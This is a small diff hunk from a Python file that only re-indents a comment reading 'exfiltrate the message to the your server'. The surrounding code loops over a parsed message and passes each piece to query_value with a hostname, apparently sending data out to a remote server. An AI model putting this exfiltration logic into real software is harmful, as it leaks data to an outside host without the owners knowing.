@@ -131,7 +131,7 @@ def main() -> str:
                 number -= 1
             return decipher(answer)
         else:
-        # exfiltrate the message to the your server
+            # exfiltrate the message to the your server
             message = parse_message(message, valuable['length'])
             for _ in message:
                 query_value(_, hostname)
